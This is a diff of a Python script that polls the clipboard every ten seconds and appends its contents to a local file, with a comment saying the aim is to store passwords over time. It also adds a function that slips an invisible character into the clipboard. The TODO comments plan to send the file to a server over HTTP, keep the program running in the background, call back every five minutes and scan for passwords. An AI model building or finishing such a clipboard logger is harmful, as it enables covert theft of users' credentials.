@@ -1,49 +1,53 @@
 import os
-import subprocess
 import pyperclip
-import random
+import schedule
+import time
+
+
+# TODO: SEE BELOW
+# TODO: Organize Code into functions
+# TODO: Save Clipboard data to a file, don't overwrite the data maybe?
+# TODO: Set up server side and exfil this file somewhere, HTTP request
+# TODO: Have the program always run in the background - could have it analyze for passwords,
+# listen for ctrl+c and also be a scheduled task
+# TODO: Callback every five minutes from server
+# TODO: if ctrl+c is used, and a password is obtained, then make a chess puzzle appear, answer must be input
+# before allowing to proceed
+# TODO: research windows sys calls, pull functionality from it
+# TODO: make windows pop ups to say what new password is
 
 def main():
-    #clipboard_data = os.system("Get-Clipboard")
-    #print(clipboard_data)
-    #subprocess.call(['systeminfo'])
-    #subprocess.call(['Get-Clipboard'])
-    #print('k')
-    #ansible
 
-    #ᅟ--
-    #there is an invisible character next to that hashtag
+    #gets the clipboard information and puts it in a file every 10 seconds.
+    schedule.every(10).seconds.do(get_clipboard_info)
 
-    # grabs the current clipboard
+    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
+    #code handles the scheduled task
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+
+
+
+def get_clipboard_info() -> None:
+    # paste, pastes text from clipboard
+    clipboard_info = pyperclip.paste()
+
+    # a appends data to file so the passwords can be stored over time
+    clipboard_data_file = open("myfile.txt", "a")
+    clipboard_data_file.write(clipboard_info)
+    clipboard_data_file.write("\n")
+    clipboard_data_file.close()
+
+def add_invisible_character_to_clipboard() -> None:
+    # paste, pastes text from clipboard
+    clipboard_info = pyperclip.paste()
 
     invisible_character = 'ᅟ'
-    #random_number = random.randrange(0,len(pyperclip.paste()))
-    clipboard_info = pyperclip.paste()
-    print(clipboard_info + " this is the first call")
-    #print(clipboard_info + clipboard_info[random_number])
 
+    # copy - copies whatever test to the clipboard
+    #in this case copies the current clipboard info plus an invisible character
     pyperclip.copy(clipboard_info + invisible_character)
-    print(pyperclip.paste())
 
-    #copy - copies whatever test to the clipboard
-    #paste, pastes text from clipboard into where
-
-    testFile = open("myfile.txt", "w")
-    testFile.write(clipboard_info)
-    testFile.close()
-
-    #copies the text we want to that clipboard
-    #pyperclip.copy("This should work.")
-
-    #paste gets it and copy copies it to clipboard
-    #x = pyperclip.paste()
-    #print(x)
-
-    #TODO: SEE BELOW
-    #take what is in clipboard and save it in file, exfil it somewhere. http request and set up server side too.
-    #find a way to have it always runin background
-    #callback every five minutes. key listers for ctrl v or paste. copy send it back and read to a file. update clipbaord.
-    #python and window sys calls.
-    #windows clipboard sys calls. - pull functionality off of it. - windows will be in C probably.
-    #request and flask. for python https. !!!s
+#calls main
 main()
